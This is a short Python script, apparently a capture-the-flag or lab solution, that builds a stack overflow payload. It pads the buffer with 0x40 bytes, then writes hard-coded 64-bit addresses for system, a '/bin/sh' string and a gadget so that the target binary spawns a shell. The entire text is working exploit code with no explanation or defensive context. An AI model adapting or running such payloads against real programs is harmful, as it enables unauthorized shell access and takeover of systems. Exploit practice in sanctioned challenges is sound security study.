import struct

def p(x):
	return struct.pack('<Q', x)

system_bin_sh = 0x462550
system = 0x400ea8
x = 'A' * 0x40
x += p(system_bin_sh - 0x40)
x += p(0x000000000040c410)
x += p(system) * 0x10

print x
